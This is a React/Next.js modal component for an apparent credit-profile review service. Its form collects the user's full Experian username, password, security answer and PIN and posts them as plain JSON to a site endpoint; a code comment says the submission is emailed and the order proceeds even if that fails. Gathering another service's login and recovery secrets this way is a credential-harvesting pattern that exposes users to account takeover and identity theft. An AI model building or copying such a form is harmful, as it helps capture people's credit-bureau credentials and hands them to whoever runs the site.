"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { motion, AnimatePresence } from "framer-motion";
import { X, User, Mail, Users, Eye, EyeOff, Lock, ShieldCheck, AlertTriangle, ArrowRight } from "lucide-react";

interface Props {
  isOpen: boolean;
  onClose: () => void;
}

const INPUT_BASE =
  "w-full bg-[#0A0A0A] border border-[#C9A84C]/20 rounded-2xl px-5 py-4 text-[#FFFFFF] text-[14px] font-bold placeholder:text-[#A8A8A8]/40 outline-none focus:border-[#C9A84C] transition-all";

export default function CreditProfileModal({ isOpen, onClose }: Props) {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const [form, setForm] = useState({
    fullName: "",
    email: "",
    referredBy: "",
    experianUsername: "",
    experianPassword: "",
    experianSecurityAnswer: "",
    experianPin: "",
  });

  // Lock body scroll when open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = "hidden";
    } else {
      document.body.style.overflow = "";
    }
    return () => { document.body.style.overflow = ""; };
  }, [isOpen]);

  const set = (field: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement>) =>
    setForm((prev) => ({ ...prev, [field]: e.target.value }));

  const allFilled = Object.values(form).every((v) => v.trim() !== "");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!allFilled) return;
    setSubmitting(true);
    try {
      const res = await fetch("/api/credit-profile", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      });
      if (!res.ok) throw new Error("Failed");
    } catch (err) {
      console.error("Credit profile submission error:", err);
      // Still proceed to checkout even if email fails — don't block the user
    } finally {
      setSubmitting(false);
      onClose();
      router.push("/checkout");
    }
  };

  return (
    <AnimatePresence>
      {isOpen && (
        /* Full-screen overlay — itself scrollable so the form is reachable on short screens */
        <div className="fixed inset-0 z-[200] overflow-y-auto">
          {/* Backdrop */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={onClose}
            className="fixed inset-0 bg-[#000000]/90 backdrop-blur-xl"
          />

          {/* Centering wrapper — min-h-full keeps content centred but lets it scroll */}
          <div className="relative z-10 flex min-h-full items-center justify-center p-4 pt-28 pb-10">
            <motion.div
              initial={{ opacity: 0, y: 40, scale: 0.97 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: 30, scale: 0.97 }}
              transition={{ duration: 0.4, ease: [0.23, 1, 0.32, 1] }}
              className="flex flex-col lg:flex-row items-start gap-8 lg:gap-14 w-full max-w-4xl"
            >
              {/* Outside label */}
              <div className="flex flex-col gap-3 lg:max-w-[200px] shrink-0 px-2 lg:px-0 lg:pt-4">
                <span className="text-[#C9A84C] text-[11px] font-black uppercase tracking-[0.2em]">
                  Get in touch
                </span>
                <h2 className="text-[#FFFFFF] font-display font-black text-3xl lg:text-4xl uppercase leading-[1.1]">
                  Review my<br />
                  <span className="text-[#C9A84C]">Credit Profile.</span>
                </h2>
                <p className="text-[#A8A8A8] text-[13px] font-medium leading-relaxed hidden lg:block">
                  Provide your details and we&apos;ll review your profile before processing your order.
                </p>
                <p className="text-[#A8A8A8] text-[12px] font-medium leading-relaxed hidden lg:block">
                  Click the link to create an account with{" "}
                  <a
                    href="https://www.experian.com"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-[#C9A84C] underline hover:opacity-80 transition-opacity"
                  >
                    Experian.com
                  </a>
                  . Please be sure to add a security answer &amp; 4 digit PIN under the settings tab.
                </p>
              </div>

              {/* Form card */}
              <div className="flex-1 bg-[#141414] border border-[#C9A84C]/20 rounded-[2.5rem] overflow-hidden shadow-[0_40px_100px_rgba(0,0,0,0.6)] w-full">
                {/* Close button */}
                <div className="flex justify-end p-6 pb-0">
                  <button
                    type="button"
                    onClick={onClose}
                    className="w-10 h-10 rounded-2xl bg-[#1E1E1E] border border-[#C9A84C]/20 flex items-center justify-center text-[#A8A8A8] hover:text-[#C9A84C] transition-all"
                  >
                    <X size={18} />
                  </button>
                </div>

                <form onSubmit={handleSubmit} className="px-6 sm:px-10 pb-10 pt-4 space-y-8">

                  {/* ── Segment 1: Contact Info ── */}
                  <div className="space-y-5">
                    <div className="flex items-center gap-3">
                      <div className="w-7 h-7 rounded-xl bg-[#C9A84C] flex items-center justify-center text-[#0A0A0A]">
                        <User size={14} strokeWidth={3} />
                      </div>
                      <h3 className="text-[#FFFFFF] font-black uppercase text-[12px] tracking-[0.15em]">
                        Contact Information
                      </h3>
                    </div>

                    {/* Full Name — full width */}
                    <div className="space-y-2">
                      <label className="text-[10px] font-black text-[#A8A8A8] uppercase tracking-widest ml-1">
                        Full Name <span className="text-[#C9A84C]">*</span>
                      </label>
                      <div className="relative">
                        <User size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-[#C9A84C]/50" />
                        <input
                          type="text"
                          placeholder="John Doe"
                          value={form.fullName}
                          onChange={set("fullName")}
                          required
                          className={`${INPUT_BASE} pl-11`}
                        />
                      </div>
                    </div>

                    {/* Email + Referred By — side by side on sm+ */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-[#A8A8A8] uppercase tracking-widest ml-1">
                          Email <span className="text-[#C9A84C]">*</span>
                        </label>
                        <div className="relative">
                          <Mail size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-[#C9A84C]/50" />
                          <input
                            type="email"
                            placeholder="john@email.com"
                            value={form.email}
                            onChange={set("email")}
                            required
                            className={`${INPUT_BASE} pl-11`}
                          />
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-[#A8A8A8] uppercase tracking-widest ml-1">
                          Who Referred You? <span className="text-[#C9A84C]">*</span>
                        </label>
                        <div className="relative">
                          <Users size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-[#C9A84C]/50" />
                          <input
                            type="text"
                            placeholder="Name or @handle"
                            value={form.referredBy}
                            onChange={set("referredBy")}
                            required
                            className={`${INPUT_BASE} pl-11`}
                          />
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Divider */}
                  <div className="relative flex items-center gap-4">
                    <div className="flex-1 h-px bg-[#C9A84C]/20" />
                    <span className="text-[#C9A84C]/50 text-[10px] font-black uppercase tracking-widest shrink-0">Step 2</span>
                    <div className="flex-1 h-px bg-[#C9A84C]/20" />
                  </div>

                  {/* ── Segment 2: Experian Info ── */}
                  <div className="space-y-5">
                    <div className="flex items-center gap-3">
                      <div className="w-7 h-7 rounded-xl bg-[#C9A84C] flex items-center justify-center text-[#0A0A0A]">
                        <ShieldCheck size={14} strokeWidth={3} />
                      </div>
                      <h3 className="text-[#FFFFFF] font-black uppercase text-[12px] tracking-[0.15em]">
                        Experian Information
                      </h3>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-[#A8A8A8] uppercase tracking-widest ml-1">
                          Experian Username <span className="text-[#C9A84C]">*</span>
                        </label>
                        <div className="relative">
                          <User size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-[#C9A84C]/50" />
                          <input
                            type="text"
                            placeholder="Your username"
                            value={form.experianUsername}
                            onChange={set("experianUsername")}
                            required
                            className={`${INPUT_BASE} pl-11`}
                          />
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-[#A8A8A8] uppercase tracking-widest ml-1">
                          Experian Password <span className="text-[#C9A84C]">*</span>
                        </label>
                        <div className="relative">
                          <Lock size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-[#C9A84C]/50" />
                          <input
                            type={showPassword ? "text" : "password"}
                            placeholder="••••••••"
                            value={form.experianPassword}
                            onChange={set("experianPassword")}
                            required
                            className={`${INPUT_BASE} pl-11 pr-12`}
                          />
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-4 top-1/2 -translate-y-1/2 text-[#A8A8A8]/40 hover:text-[#C9A84C] transition-colors"
                          >
                            {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                          </button>
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-[#A8A8A8] uppercase tracking-widest ml-1">
                          Security Answer <span className="text-[#C9A84C]">*</span>
                        </label>
                        <div className="relative">
                          <ShieldCheck size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-[#C9A84C]/50" />
                          <input
                            type="text"
                            placeholder="Your security answer"
                            value={form.experianSecurityAnswer}
                            onChange={set("experianSecurityAnswer")}
                            required
                            className={`${INPUT_BASE} pl-11`}
                          />
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-[#A8A8A8] uppercase tracking-widest ml-1">
                          4-Digit PIN <span className="text-[#C9A84C]">*</span>
                        </label>
                        <div className="relative">
                          <Lock size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-[#C9A84C]/50" />
                          <input
                            type="password"
                            inputMode="numeric"
                            maxLength={4}
                            placeholder="••••"
                            value={form.experianPin}
                            onChange={(e) => {
                              const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                              setForm((prev) => ({ ...prev, experianPin: val }));
                            }}
                            required
                            className={`${INPUT_BASE} pl-11 tracking-[0.3em]`}
                          />
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Warning note */}
                  <div className="flex items-start gap-3 bg-[#C9A84C]/5 border border-[#C9A84C]/20 rounded-2xl p-5">
                    <AlertTriangle size={16} className="text-[#C9A84C] shrink-0 mt-0.5" />
                    <p className="text-[11px] font-bold text-[#A8A8A8] leading-relaxed">
                      <span className="text-[#C9A84C] font-black">Important:</span> Every field is required. If the form is incomplete, we will not be able to review your credit profile or process your order.
                    </p>
                  </div>

                  {/* Submit */}
                  <button
                    type="submit"
                    disabled={!allFilled || submitting}
                    className="w-full h-16 rounded-2xl bg-[#C9A84C] text-[#0A0A0A] font-black text-[14px] uppercase tracking-widest flex items-center justify-center gap-3 transition-all active:scale-95 shimmer shadow-xl disabled:opacity-40 disabled:cursor-not-allowed disabled:active:scale-100"
                  >
                    {submitting ? (
                      <>
                        <div className="w-5 h-5 border-2 border-[#0A0A0A] border-t-transparent rounded-full animate-spin" />
                        Submitting...
                      </>
                    ) : (
                      <>
                        Review My Credit Profile
                        <ArrowRight size={18} />
                      </>
                    )}
                  </button>
                </form>
              </div>
            </motion.div>
          </div>
        </div>
      )}
    </AnimatePresence>
  );
}
